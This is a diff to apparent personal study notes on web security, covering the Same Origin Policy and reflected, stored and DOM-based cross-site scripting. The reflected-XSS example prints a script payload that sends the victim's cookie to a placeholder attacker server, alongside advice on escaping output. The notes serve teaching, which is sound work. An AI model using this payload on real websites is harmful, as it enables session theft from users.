@@ -66,10 +66,10 @@ An **IDOR** occurs when a web application exposes a direct reference to an inter
 Most of the browser's security machanisms rely on the possibility of *isolating documents* (and execution contexts) depending on the resource's origin (generally, different websites or sources shouldn't access each other's content)
 - a malicious website cannot run scripts that access data and functionalities of other websites visited by the user (*cross-site scripting*)
 
-> This is part of the **Same Origin Policy** (SOP), an essential security concept for web browsers, designed to isolate documents from different websites.
+This is part of the **Same Origin Policy** (SOP), an essential security concept for web browsers, designed to isolate documents from different websites.
 
 > [!summary] SOP "rules"
-> - a website cannot read or modify cookies or other DOM elements of other websites
+> - a website cannot read or modify cookies or other DOM (represents the page as a tree of objects, essentially acting as a bridge between scripts and the web page's structure/content in the browser) elements of other websites
 > - actions like "modify content of another window" should always require a security check
 > - a website can request a resource from another website, but can't process the received data
 > - actions like "follow a link" should always be allowed
@@ -104,4 +104,20 @@ The main steps are usually:
 2. the client’s brower executes any code and renders any HTML present on the vulnerable page
 
 There are different *types of XSS*:
-- **reflected XSS**
+- **reflected XSS** ⟶ the injection happens in a parameter used by the page to *dynamically display information* 
+
+>[!example] example 
+> ![[reflected-XSS.png|center|600]]
+> the vulnerability is that the website's response script that directly echoes the user’s `keyword` parameter into the HTML response, without any sanitization or encoding
+>- the attacker crafts a malicious link (to the vulnerable site) containing the XSS payload, that is designed to read the cookie and make a request to the attacker’s server. in this case, the payload is:
+>```html
+><script>window.location='http://attacker/cookie' + document.cookie</script>
+>```
+>- the attacker sends the URL to the victim, that executes it sending a GET request to the vulnerable site with the malicious payload
+>- the vulnerable site executes its vulnerable response script, concatenating the raw, uninvalidated payload into the HTML response
+>	- while it can make sense to echo the search result for client-side logging/tracking, but it should be escaped (escaping characters like `<>"'^&`)
+>- when the victim’s browser receives the response, it starts rendering the page. when it gets to the `<script>` tag, it executes the code immediately, sending a GET request to the attacker’s server with its cookie as a parameter
+
+
+- **stored XSS** ⟶ the injection is *stored in a page* of the web application (typically a DB) and displayed to users accessing it
+- **DOM-based XSS** ⟶ the injection happens in a *parameter used by a script* running within the page itself
